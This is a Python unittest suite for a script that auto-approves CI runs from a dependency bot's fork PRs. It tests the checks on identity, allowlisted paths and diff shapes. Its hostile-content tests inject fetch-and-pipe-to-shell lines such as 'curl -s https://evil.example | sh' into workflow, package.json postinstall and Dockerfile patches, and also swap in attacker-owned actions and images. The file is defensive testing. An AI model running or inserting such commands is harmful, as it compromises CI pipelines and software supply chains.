"""Offline tests for scripts/approve_bot_runs.py: fixture JSON, no network, stdlib only.

    python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import copy
import json
import sys
import unittest
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import approve_bot_runs as abr  # noqa: E402

FIXTURE = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_valid.json").read_text())
PATCHES = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_patches.json").read_text())["cases"]


class FakeApi:
    """Serves the fixture; fails the test on any request the fixture does not describe."""

    def __init__(self, fx: dict[str, Any]):
        self.fx = fx

    def repo(self, full_name: str) -> dict[str, Any]:
        assert full_name == self.fx["target"], full_name
        return self.fx["target_repo"]

    def repo_by_id(self, repo_id: int) -> dict[str, Any]:
        assert repo_id == self.fx["head_repo"]["id"], repo_id
        return self.fx["head_repo"]

    def pull(self, full_name: str, number: int) -> dict[str, Any]:
        return next(p for p in self.fx["pulls"] if p["number"] == number)

    def open_pulls_from(self, full_name: str, head_owner: str, head_branch: str) -> list[dict[str, Any]]:
        assert head_owner == abr.BOT_LOGIN
        return [p for p in self.fx["pulls"] if p["head"]["ref"] == head_branch]

    def pull_files(self, full_name: str, number: int) -> list[dict[str, Any]]:
        return self.fx["files"]


def decide(fx: dict[str, Any]) -> abr.Decision:
    return abr.decide(fx["target"], fx["run"], FakeApi(fx))


class DecideTest(unittest.TestCase):
    def setUp(self) -> None:
        self.fx = copy.deepcopy(FIXTURE)

    def assertSkip(self, fragment: str) -> None:
        d = decide(self.fx)
        self.assertFalse(d.approve, d.reason)
        self.assertIn(fragment, d.reason)

    def test_valid_bot_run_approves(self) -> None:
        d = decide(self.fx)
        self.assertTrue(d.approve, d.reason)
        self.assertEqual(d.pr, 190)

    def test_linked_pull_requests_path_approves(self) -> None:
        self.fx["run"]["pull_requests"] = [{"number": 190, "base": {"repo": {"id": 1000}}}]
        self.assertTrue(decide(self.fx).approve)

    def test_bot_actor_but_pr_author_is_someone_else(self) -> None:
        self.fx["pulls"][0]["user"] = {"login": "mallory", "id": 42, "type": "User"}
        self.assertSkip("PR author id 42")

    def test_pr_author_bot_login_but_type_bot(self) -> None:
        self.fx["pulls"][0]["user"]["type"] = "Bot"
        self.assertSkip("PR author type")

    def test_head_repo_not_a_fork_of_target(self) -> None:
        self.fx["head_repo"]["parent"] = {"id": 9, "full_name": "unified-systems-com/tap"}
        self.assertSkip("not a fork of the target")

    def test_head_repo_not_a_fork_at_all(self) -> None:
        self.fx["run"]["head_repository"]["fork"] = False
        self.assertSkip("not a fork")

    def test_head_sha_mismatch(self) -> None:
        self.fx["pulls"][0]["head"]["sha"] = "b" * 40
        self.assertSkip("head sha differs")

    def test_disallowed_file(self) -> None:
        self.fx["files"].append({"filename": "scripts/evil.sh", "status": "modified"})
        self.fx["pulls"][0]["changed_files"] = 4
        self.assertSkip("not on the allowlist: scripts/evil.sh")

    def test_login_match_with_wrong_id(self) -> None:
        self.fx["run"]["actor"] = {"login": abr.BOT_LOGIN, "id": 1, "type": "User"}
        self.assertSkip("actor id 1")

    def test_triggering_actor_not_bot(self) -> None:
        self.fx["run"]["triggering_actor"]["id"] = 286052
        self.assertSkip("triggering actor")

    def test_head_repo_owner_login_match_wrong_id(self) -> None:
        self.fx["run"]["head_repository"]["owner"]["id"] = 7
        self.assertSkip("not owned by the fork bot")

    def test_not_waiting_for_approval(self) -> None:
        self.fx["run"]["conclusion"] = "success"
        self.assertSkip("not waiting for approval")

    def test_event_not_pull_request(self) -> None:
        self.fx["run"]["event"] = "pull_request_target"
        self.assertSkip("not pull_request")

    def test_base_not_default_branch(self) -> None:
        self.fx["pulls"][0]["base"]["ref"] = "release"
        self.assertSkip("not the default branch")

    def test_zero_or_two_open_prs(self) -> None:
        self.fx["pulls"] = []
        self.assertSkip("0 open PRs")
        self.fx = copy.deepcopy(FIXTURE)
        self.fx["pulls"].append(copy.deepcopy(self.fx["pulls"][0]) | {"number": 191})
        self.assertSkip("2 open PRs")

    def test_removed_or_renamed_file(self) -> None:
        self.fx["files"][0]["status"] = "removed"
        self.assertSkip("status 'removed'")
        self.fx["files"][0].update(status="renamed", previous_filename="scripts/x.sh")
        self.assertSkip("status 'renamed'")

    def test_added_workflow_file(self) -> None:
        self.fx["files"][0]["status"] = "added"
        self.assertSkip("adds a workflow file")

    def test_nested_workflow_dir_not_allowed(self) -> None:
        self.fx["files"][0]["filename"] = ".github/workflows/sub/ci.yml"
        self.assertSkip("not on the allowlist")

    def test_too_many_files(self) -> None:
        self.fx["files"] = [{"filename": f"boot/{i}.boot.json", "status": "modified"} for i in range(51)]
        self.fx["pulls"][0]["changed_files"] = 51
        self.assertSkip("51 changed files")

    def test_file_list_shorter_than_changed_files(self) -> None:
        self.fx["pulls"][0]["changed_files"] = 4
        self.assertSkip("changed_files=4")


class AllowlistTest(unittest.TestCase):
    def test_paths(self) -> None:
        ok = [".github/workflows/ci.yml", ".github/workflows/a.yaml", "pyproject.toml", "uv.lock",
              "package.json", "package-lock.json", "boot/dev.boot.json", "x.boot.json",
              "tap-plugin.toml", "pkg/tap-plugin.toml", "CHANGELOG.md", ".release-please-manifest.json",
              "release-please-config.json", ".env", "Dockerfile", "renovate.json5"]
        bad = ["scripts/evil.sh", ".github/workflows/x/ci.yml", ".github/actions/a/action.yml",
               "sub/pyproject.toml", "docker/Dockerfile", ".envrc", "uv.lock.bak", "src/CHANGELOG.md"]
        for p in ok:
            self.assertTrue(abr.path_allowed(p), p)
        for p in bad:
            self.assertFalse(abr.path_allowed(p), p)


class ArgsTest(unittest.TestCase):
    def test_default_is_dry_run(self) -> None:
        self.assertFalse(abr.parse_args([]).yes)
        self.assertFalse(abr.parse_args(["--repo", "tap"]).yes)
        self.assertFalse(abr.parse_args(["--dry-run"]).yes)
        self.assertTrue(abr.parse_args(["--yes"]).yes)


class FleetParseTest(unittest.TestCase):
    def test_real_global_js(self) -> None:
        names = abr.parse_fleet((ROOT / "renovate" / "global.js").read_text())
        self.assertIn("tap", names)
        self.assertIn("tap-plugin-github-core", names)
        self.assertGreater(len(names), 10)

    def test_commented_name_not_listed(self) -> None:
        text = 'const SELF_CONFIGURED = [\n];\nconst FLEET = [\n  "a",\n  // "b",\n];\n'
        self.assertEqual(abr.parse_fleet(text), ["a"])

    def test_zero_repos_fails(self) -> None:
        text = "const SELF_CONFIGURED = [\n  { repository: `${ORG}/tap` },\n];\nconst FLEET = [\n  // none\n];\n"
        with self.assertRaisesRegex(abr.FleetParseError, "zero"):
            abr.parse_fleet(text)

    def test_missing_block_fails(self) -> None:
        with self.assertRaises(abr.FleetParseError):
            abr.parse_fleet("module.exports = {};\n")

    def test_unsafe_name_fails(self) -> None:
        text = 'const SELF_CONFIGURED = [\n];\nconst FLEET = [\n  "a/../b",\n];\n'
        with self.assertRaises(abr.FleetParseError):
            abr.parse_fleet(text)


OLD_SHA = "1ffb2417032350ec1d31f0af400c25b225ee66ca"
NEW_SHA = "57505751b27900e5d58fc0c2b40df32f18a2b980"
CI_USES = "    uses: unified-systems-com/tap/.github/workflows/plugin-ci.yml@"


def case(name: str) -> list[dict[str, Any]]:
    return copy.deepcopy(PATCHES[name]["files"])


def check(files: list[dict[str, Any]]) -> str | None:
    return abr.check_files(files, len(files))


def patch_of(files: list[dict[str, Any]], filename: str) -> dict[str, Any]:
    return next(f for f in files if f["filename"] == filename)


def edit(files: list[dict[str, Any]], filename: str, old: str, new: str) -> list[dict[str, Any]]:
    f = patch_of(files, filename)
    assert old in f["patch"], (filename, old)
    f["patch"] = f["patch"].replace(old, new, 1)
    return files


def one_file(filename: str, patch: str, status: str = "modified") -> list[dict[str, Any]]:
    return [{"filename": filename, "status": status, "patch": patch}]


class RealShapesTest(unittest.TestCase):
    """Every shape here is a real merged bot PR's diff (the fixture names each PR)."""

    APPROVED = ("workflow_sha_bump", "workflow_long_comment", "workflow_main_pin", "workflow_main_pin_comment",
                "workflow_tag_to_sha", "workflow_version_comment", "boot_commit", "dockerfile_digest",
                "dockerfile_copy_from", "dockerfile_tag", "package_json", "pyproject_deps", "release_plugin")

    def test_real_bot_diffs_pass(self) -> None:
        for name in self.APPROVED:
            with self.subTest(name):
                self.assertIsNone(check(case(name)))

    def test_real_release_pr_with_uv_lock_needs_a_human(self) -> None:
        self.assertEqual(check(case("release_tap")), "needs a human look: uv.lock")

    def test_real_release_pr_without_uv_lock_passes(self) -> None:
        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
        self.assertIsNone(check(files))

    def test_real_tag_to_tag_bump_refused(self) -> None:
        self.assertIn("not moved to a 40-hex commit sha", check(case("workflow_tag_to_tag")) or "")

    def test_whole_decision_with_real_patches_approves(self) -> None:
        fx = copy.deepcopy(FIXTURE)
        fx["files"] = case("workflow_main_pin")
        self.assertTrue(decide(fx).approve)


class HostileContentTest(unittest.TestCase):
    """Each case is a real bot diff with one hostile edit; every one must be refused."""

    def assertRefused(self, files: list[dict[str, Any]], fragment: str) -> None:
        why = check(files)
        self.assertIsNotNone(why, "hostile diff passed")
        self.assertIn(fragment, why or "")

    def test_workflow_extra_run_line(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}{NEW_SHA}\n", f"+{CI_USES}{NEW_SHA}\n+    run: curl -s https://evil.example | sh\n")
        self.assertRefused(files, "1 lines removed but 2 added")

    def test_workflow_run_line_rewritten(self) -> None:
        files = one_file(".github/workflows/ci.yml",
                         "@@ -5,3 +5,3 @@ jobs:\n     steps:\n-      - run: make test\n+      - run: curl evil | sh\n")
        self.assertRefused(files, "not a `uses:` line")

    def test_workflow_uses_other_action(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}", "+    uses: mallory/tap/.github/workflows/plugin-ci.yml@")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_uses_other_file_in_same_repo(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}", "+    uses: unified-systems-com/tap/.github/workflows/evil.yml@")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_new_ref_is_a_tag(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}v9.9.9")
        self.assertRefused(files, "not moved to a 40-hex commit sha")

    def test_workflow_new_ref_is_a_short_sha(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}{NEW_SHA[:12]}")
        self.assertRefused(files, "not moved to a 40-hex commit sha")

    def test_workflow_permissions_change(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     "       contents: read\n", "-      contents: read\n+      contents: write\n")
        self.assertRefused(files, "not a `uses:` line")

    def test_workflow_indentation_change(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}", f"+  {CI_USES}")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_text_after_comment_changes(self) -> None:
        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
                     "# v7   # for .trivyignore", "# v7   # for .trivyignore\n+        run: curl evil")
        self.assertIsNotNone(check(files))
        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
                     "# v7   # for .trivyignore", "# v7   # something else")
        self.assertRefused(files, "trailing text changes beyond a version comment")

    def test_workflow_only_added_line(self) -> None:
        files = one_file(".github/workflows/ci.yml",
                         f"@@ -5,2 +5,3 @@ jobs:\n {CI_USES}{OLD_SHA}\n+    secrets: inherit\n     with:\n")
        self.assertRefused(files, "0 lines removed but 1 added")

    def test_package_json_postinstall_added(self) -> None:
        files = edit(case("package_json"), "package.json",
                     '   "private": true,\n', '   "private": true,\n+  "scripts": {"postinstall": "curl evil | sh"},\n')
        self.assertRefused(files, "0 lines removed but 1 added")

    def test_package_json_change_inside_scripts(self) -> None:
        files = one_file("package.json",
                         '@@ -2,5 +2,5 @@\n   "name": "x",\n   "scripts": {\n-    "build": "1.0.0",\n+    "build": "1.0.1",\n'
                         '     "test": "node t.js"\n')
        self.assertRefused(files, "outside the dependency sections")

    def test_package_json_dependency_to_a_git_url(self) -> None:
        files = edit(case("package_json"), "package.json", '+    "cytoscape": "3.34.2",', '+    "cytoscape": "github:mallory/cytoscape",')
        self.assertRefused(files, "not moved to a version")

    def test_dockerfile_run_change(self) -> None:
        files = one_file("Dockerfile", "@@ -10,3 +10,3 @@\n FROM x AS y\n-RUN apk add curl\n+RUN curl evil | sh\n")
        self.assertRefused(files, "not a `FROM` or `COPY --from=` image line")

    def test_dockerfile_from_switches_image(self) -> None:
        files = edit(case("dockerfile_digest"), "Dockerfile",
                     "+FROM cgr.dev/chainguard/wolfi-base:latest@", "+FROM docker.io/mallory/wolfi-base:latest@")
        self.assertRefused(files, "changes its image, stage name or arguments")

    def test_dockerfile_from_renames_stage(self) -> None:
        files = case("dockerfile_digest")
        f = patch_of(files, "Dockerfile")
        lines = f["patch"].split("\n")
        i = next(n for n, line in enumerate(lines) if line.startswith("+FROM"))
        lines[i] = lines[i].replace(" AS ossl-builder", " AS base")
        f["patch"] = "\n".join(lines)
        self.assertRefused(files, "changes its image, stage name or arguments")

    def test_dockerfile_digest_dropped(self) -> None:
        files = one_file("Dockerfile", "@@ -1,1 +1,1 @@\n-FROM node:22-alpine@sha256:" + "a" * 64 + " AS js\n+FROM node:24-alpine AS js\n")
        self.assertRefused(files, "not pinned by a sha256 digest")

    def test_boot_record_url_change(self) -> None:
        url = '          "url": "https://github.com/unified-systems-com/tap-plugin-compliance-core",'
        files = one_file("boot/core_ci.boot.json",
                         f"@@ -65,1 +65,1 @@\n-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
        self.assertRefused(files, "`url` changes")
        files = edit(case("boot_commit"), "boot/core_ci.boot.json", f" {url}\n",
                     f"-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
        self.assertIsNotNone(check(files))

    def test_boot_record_commit_not_a_sha(self) -> None:
        files = edit(case("boot_commit"), "boot/core_ci.boot.json",
                     '+          "commit": "e5464e4dd87758d41552d45df42c0303b0de48e3"', '+          "commit": "main"')
        self.assertRefused(files, "not a 40-hex sha")

    def test_env_other_key(self) -> None:
        files = edit(case("release_tap"), ".env", "-TAP_VERSION=0.1.2 # x-release-please-version\n+TAP_VERSION=0.1.3",
                     "-TAP_WEB_IMAGE=ghcr.io/x\n+TAP_WEB_IMAGE=ghcr.io/mallory/x\n TAP_VERSION=0.1.2")
        self.assertRefused(files, "not a value-only `TAP_VERSION=` move")

    def test_env_version_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_tap"), ".env")]
        self.assertRefused(files, "outside a release-please PR")

    def test_release_file_version_differs_from_manifest(self) -> None:
        files = edit(case("release_plugin"), "tap_plugin/github_core/tap-plugin.toml",
                     '+plugin_version = "0.12.2"', '+plugin_version = "9.9.9"')
        self.assertRefused(files, "does not match the release manifest")

    def test_missing_patch(self) -> None:
        files = case("workflow_sha_bump")
        del files[1]["patch"]
        self.assertRefused(files, "no diff from GitHub for .github/workflows/nightly.yml")

    def test_uv_lock_touched(self) -> None:
        files = case("pyproject_deps") + [{"filename": "uv.lock", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}]
        self.assertRefused(files, "needs a human look: uv.lock")

    def test_other_allowlisted_paths_need_a_human(self) -> None:
        for name in ("package-lock.json", "renovate.json5", "release-please-config.json"):
            with self.subTest(name):
                self.assertRefused(one_file(name, "@@ -1 +1 @@\n-a\n+b"), f"needs a human look: {name}")

    def test_changelog_with_removed_lines(self) -> None:
        files = edit(case("release_tap"), "CHANGELOG.md", " # Changelog\n", "-# Changelog\n")
        files = [f for f in files if f["filename"] != "uv.lock"]
        self.assertRefused(files, "CHANGELOG.md has removed lines")

    def test_changelog_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_plugin"), "CHANGELOG.md")]
        self.assertRefused(files, "CHANGELOG.md changes outside a release-please PR")

    def test_changelog_below_the_top(self) -> None:
        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
        f = patch_of(files, "CHANGELOG.md")
        f["patch"] = "@@ -40,3 +40,4 @@\n x\n+* sneaky\n y\n"
        self.assertRefused(files, "changed below its top")

    def test_manifest_not_a_version(self) -> None:
        files = edit(case("release_plugin"), ".release-please-manifest.json", '+  ".": "0.12.2"', '+  ".": "latest"')
        self.assertRefused(files, "not a version")

    def test_plugin_manifest_other_key(self) -> None:
        files = one_file("tap_plugin/x/tap-plugin.toml", '@@ -3,1 +3,1 @@\n-requires_tap = ">=0.2.1"\n+requires_tap = ">=0.0.0"\n')
        self.assertRefused(files, "`requires_tap` changes")

    def test_plugin_manifest_sha256_refresh(self) -> None:
        # Shape of duo-tap's [[boot.records]] digest line; no bot PR has changed one yet.
        patch = '@@ -55,1 +55,1 @@\n-sha256 = "' + "b" * 64 + '"\n+sha256 = "' + "c" * 64 + '"\n'
        self.assertIsNone(check(one_file("tap_plugin/duo/tap-plugin.toml", patch)))
        self.assertRefused(one_file("tap_plugin/duo/tap-plugin.toml", patch.replace("c" * 64, "c" * 63)), "not 64 hex")

    def test_pyproject_dependency_renamed(self) -> None:
        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "rufff>=0.16,<0.17",')
        self.assertRefused(files, "changes more than its version specifier")

    def test_pyproject_url_dependency(self) -> None:
        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "ruff @ https://evil.example/r.whl",')
        self.assertRefused(files, "not a version specifier")

    def test_pyproject_version_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_tap"), "pyproject.toml")]
        self.assertRefused(files, "outside a release-please PR")

    def test_whole_decision_refuses_hostile_workflow(self) -> None:
        fx = copy.deepcopy(FIXTURE)
        fx["files"] = edit(fx["files"], ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}\n",
                           f"+{CI_USES}{NEW_SHA}\n+    run: curl evil | sh\n")
        d = decide(fx)
        self.assertFalse(d.approve)
        self.assertIn(".github/workflows/ci.yml", d.reason)


if __name__ == "__main__":
    unittest.main()
